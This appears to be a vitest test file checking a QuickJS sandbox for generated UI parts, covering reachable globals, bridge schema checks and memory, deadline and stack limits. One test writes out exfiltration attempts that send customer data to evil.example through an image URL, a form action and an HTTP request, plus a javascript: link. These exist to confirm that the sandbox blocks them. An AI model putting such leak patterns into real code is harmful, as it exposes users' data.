// Q4: what generated code can and can't reach from inside compose, and the sandbox spike's three
// findings on this path: (1) ArrayBuffer memory outside setMemoryLimit, (2) the deadline that a
// loop over slow builtins overruns, (3) a stack limit above ~384 KB that crashes the module.
import {describe, it, expect, afterEach} from 'vitest'
import {start, until, parts, allReady, sleep, fixRequests} from './helpers.js'
import {custom} from '../fixtures/app.js'
import {GOOD} from '../fixtures/code.js'

let t
afterEach(() => { t?.dispose(); t = null })

const probe = (body, extraModel = '') => `
${body}
export default function Probe({ state }) { return <pre className="probe">{state.out}</pre> }
Probe.initialState = { out: OUT }
Probe.intent = ({ DOM, PROPS }) => ({ DATA: PROPS.stream, GO: DOM.select('.probe').events('click') })
Probe.model = { DATA: (state, data) => ({ ...state, ...data }), GO: (state) => { ${extraModel}; return state } }
`

describe('what the code can reach', () => {
  for (const isolation of ['worker', 'thread']) {
    it(`${isolation}: no page, no network, no storage, no worker globals; require only 'sygnal'`, async () => {
      const code = probe(`
const g = Function('return this')()
const names = ['document', 'window', 'fetch', 'XMLHttpRequest', 'WebSocket', 'EventSource', 'localStorage', 'indexedDB', 'navigator', 'location',
  'process', 'WebAssembly', 'importScripts', 'postMessage', 'self', 'parent', 'top', 'opener', 'SharedArrayBuffer', 'Atomics', 'performance']
const seen = names.filter((n) => typeof g[n] !== 'undefined')
let req = ''
for (const m of ['fs', 'child_process', 'node:worker_threads', 'quickjs-emscripten-core']) { try { require(m); req += m + ' ' } catch (e) { /* refused */ } }
let dyn = 'no import()'
try { import('data:text/javascript,1').then(() => {}, () => {}) } catch (e) { dyn = 'import() fails' }
const OUT = 'globals:' + seen.join(',') + '|require:' + req + '|' + dyn`)
      ;({t} = await start([custom('Probe', [], code)], {isolation, checks: false}))
      await until(() => allReady(t, 1))
      // QuickJS has SharedArrayBuffer as a builtin, but no Atomics and no threads to share it with
      // (the sandbox README says "no SharedArrayBuffer": the constructor exists, the timer doesn't)
      expect(t.container.querySelector('.probe').textContent).toBe('globals:SharedArrayBuffer|require:|no import()')
    })
  }

  it("the bridge is the boundary: __host.emit directly still goes through the page's schemas", async () => {
    const code = probe(`
__host.emit(JSON.stringify({ type: 'FILTER_STATUS', data: { status: 'deleted' } }))   // not one of the enum
__host.emit(JSON.stringify({ type: 'DROP_TABLES', data: {} }))                       // not declared
__host.emit(JSON.stringify({ type: 'OPEN_CUSTOMER', data: { id: 15 } }))             // declared and valid: allowed
const OUT = 'sent'`)
    let warnings
    ;({t, warnings} = await start([custom('Probe', [], code)], {checks: false}))
    await until(() => t.state.openCustomer === 15)
    await until(() => warnings.length === 2)
    expect(t.state.statusFilter).toBe(null)
    expect(warnings.join('\n')).toMatch(/dropped 'FILTER_STATUS'[\s\S]*undeclared event 'DROP_TABLES'/)
  })

  it('no network through the HTTP driver (no capability) or through markup (img src, links, forms)', async () => {
    const code = `
export default function Leak({ state }) {
  const q = encodeURIComponent(JSON.stringify(state.customers || []))
  return <div className="leak">
    <img src={'https://evil.example/p.gif?d=' + q} alt="x" />
    <a href={'javascript:alert(1)'} className="js">a</a>
    <form action="https://evil.example/post"><input name="d" value={q} /><button className="send">Send</button></form>
    <p className="http">{state.http}</p>
  </div>
}
Leak.initialState = { http: 'waiting' }
Leak.intent = ({ PROPS }) => ({ DATA: PROPS.stream })
Leak.model = {
  DATA: { STATE: (s, d) => ({ ...s, ...d }), HTTP: (s) => ({ url: 'https://evil.example/x?d=' + encodeURIComponent(JSON.stringify(s.customers)), ok: 'GOT', error: 'DENIED' }) },
  GOT: (s) => ({ ...s, http: 'sent!' }),
  DENIED: (s, e) => ({ ...s, http: 'denied: ' + e.error.message }),
}`
    ;({t} = await start([custom('Leak', ['customers'], code)], {checks: false}))
    await until(() => /denied/.test(t.container.querySelector('.http')?.textContent || ''), 5000)
    expect(t.container.querySelector('.http').textContent).toMatch(/denied: sandbox fetch denied: no fetch capability/)
    const box = t.container.querySelector('.leak')
    expect(box.querySelector('img').hasAttribute('src')).toBe(false)
    expect(box.querySelector('a.js').hasAttribute('href')).toBe(false)
    expect(box.querySelector('form').hasAttribute('action')).toBe(false)
    const submit = new window.Event('submit', {bubbles: true, cancelable: true})
    box.querySelector('form').dispatchEvent(submit)
    expect(submit.defaultPrevented).toBe(true)
  })

  it("the box's elements never trigger the host's own selectors (a guest .picked is not the host's)", async () => {
    let Dashboard
    ;({t, Dashboard} = await start(null))
    t.dispose()
    const intent = Dashboard.intent
    Dashboard.intent = (so) => ({...intent(so), DANGER: so.DOM.select('.picked').events('click')})
    Dashboard.model = {...Dashboard.model, DANGER: (s) => ({...s, danger: (s.danger || 0) + 1})}
    const {renderComponent} = await import('sygnal')
    t = renderComponent(Dashboard, {dom: 'real'})
    await t.ready()
    const code = GOOD.refunds.replace('<p className="muted">Refunds</p>', '<p className="picked">Refunds</p>')
    const {composePage} = await import('./helpers.js')
    await composePage(t, [custom('Refunds', ['orders'], code)])
    await until(() => allReady(t, 1))
    t.container.querySelector('.gen-box .picked').click()
    await sleep(50)
    expect(t.state.danger).toBe(undefined)
    t.container.querySelector('main > .picked').click()
    await until(() => t.state.danger === 1)
  })
})

describe('the three sandbox findings, on the generated-part path', () => {
  for (const isolation of ['worker', 'thread']) {
    it(`(1) ${isolation}: ArrayBuffers can't grow past the part's capped instance (48 MB): stopped in well under a second`, async () => {
      const code = probe('const OUT = "ready"', `
        const keep = []
        try { for (let i = 0; i < 256; i++) keep.push(new Uint8Array(8 << 20).fill(1)) } catch (e) { state = { ...state, out: 'stopped at ' + keep.length * 8 + ' MB: ' + e.message } }
        return state`)
      const rss0 = process.memoryUsage().rss
      ;({t} = await start([custom('Probe', [], code), custom('Refunds', ['orders'], GOOD.refunds)], {isolation, checks: false}))
      await until(() => allReady(t, 2))
      const t0 = performance.now()
      t.container.querySelector('.probe').click()
      await until(() => /stopped at/.test(t.container.querySelector('.probe').textContent), 5000)
      const ms = performance.now() - t0
      const mb = +/stopped at (\d+)/.exec(t.container.querySelector('.probe').textContent)[1]
      expect(mb).toBeLessThan(48)
      expect(ms).toBeLessThan(1000)
      expect((process.memoryUsage().rss - rss0) / 2 ** 20).toBeLessThan(400)
      // the neighbour part is unaffected
      expect(t.container.querySelector('.badge').textContent).toBe('10 orders')
      console.log(`[finding 1] ${isolation}: stopped at ${mb} MB in ${ms.toFixed(0)} ms`)
    })
  }

  it('(2) worker (default): a loop over a slow builtin is terminated by the watchdog; the page and the other parts keep running', async () => {
    const code = probe('const big = Array.from({ length: 1e4 }, (_, i) => ({ i, s: "x".repeat(50) }))\nconst OUT = "ready"', 'for (;;) JSON.parse(JSON.stringify(big))')
    ;({t} = await start([custom('Probe', [], code), custom('Pending', ['orders'], GOOD.pending)], {limits: {hardMs: 300}, checks: false}))
    await until(() => allReady(t, 2))
    let ticks = 0
    const iv = setInterval(() => ticks++, 10)
    const t0 = performance.now()
    t.container.querySelector('.probe').click()
    const probeNode = parts(t)[0].node
    await until(() => t.state.page.local[probeNode]?.status === 'failed', 5000)
    const ms = performance.now() - t0
    clearInterval(iv)
    expect(t.state.page.local[probeNode].error.reason).toBe('timeout')
    expect(ms).toBeLessThan(1500)
    expect(ticks).toBeGreaterThan(ms / 10 / 3)
    // the other part still answers
    const q = t.container.querySelector('.q')
    q.value = '100'
    q.dispatchEvent(new window.Event('input', {bubbles: true}))
    await until(() => t.container.querySelector('.count').textContent === '3 pending')
    // and the repair loop heard about it (a model can loop by accident)
    expect(fixRequests(t)[0].messages[0].content).toMatch(/What went wrong: timeout: the worker didn't answer in 300 ms/)
    console.log(`[finding 2] worker: terminated after ${ms.toFixed(0)} ms (hardMs 300), page timer ticks meanwhile: ${ticks}`)
  })

  it('(2) thread (opt-in): a plain loop stops at the 50 ms deadline; a loop over a slow builtin overruns it (measured, bounded)', async () => {
    const plain = probe('const OUT = "ready"', 'for (;;) {}')
    const slow = probe('const big = Array.from({ length: 2000 }, (_, i) => ({ i, s: "x".repeat(50) }))\nconst OUT = "ready"', 'for (let i = 0; i < 2500; i++) JSON.parse(JSON.stringify(big))')
    ;({t} = await start([custom('Plain', [], plain), custom('Slow', [], slow)], {isolation: 'thread', checks: false}))
    await until(() => allReady(t, 2))
    const [a, b] = parts(t)
    let t0 = performance.now()
    a.el.querySelector('.probe').click()            // in-thread: the click returns when the guest is stopped
    const plainMs = performance.now() - t0
    await until(() => t.state.page.local[a.node]?.status === 'failed')
    expect(t.state.page.local[a.node].error.reason).toBe('timeout')
    t0 = performance.now()
    b.el.querySelector('.probe').click()
    const slowMs = performance.now() - t0
    expect(plainMs).toBeLessThan(120)
    // QuickJS polls the deadline once per 10,000 ticks and never inside a builtin: this ran far past 50 ms
    expect(slowMs).toBeGreaterThan(300)
    console.log(`[finding 2] thread: plain loop blocked the page ${plainMs.toFixed(0)} ms; 2,500 JSON round trips ${slowMs.toFixed(0)} ms (deadline 50 ms)`)
  })

  it('(3) thread: deep recursion is a QuickJS stack overflow (256 KB), not a crash; each part has its own module', async () => {
    const code = probe('const OUT = "ready"', 'const f = (n) => f(n + 1) + 1; try { f(0) } catch (e) { return { ...state, out: e.name + ": " + e.message } }')
    ;({t} = await start([custom('Probe', [], code), custom('Pending', ['orders'], GOOD.pending)], {isolation: 'thread', checks: false}))
    await until(() => allReady(t, 2))
    t.container.querySelector('.probe').click()
    await until(() => /stack overflow/.test(t.container.querySelector('.probe').textContent))
    expect(t.container.querySelector('.probe').textContent).toBe('InternalError: stack overflow')
    // the same part goes on working (no poisoned module), and so does its neighbour
    t.container.querySelector('.probe').click()
    await sleep(20)
    expect(parts(t).map((p) => p.status)).toEqual(['ok', 'ok'])
    const q = t.container.querySelector('.q')
    q.value = '100'
    q.dispatchEvent(new window.Event('input', {bubbles: true}))
    await until(() => t.container.querySelector('.count').textContent === '3 pending')
  })
})
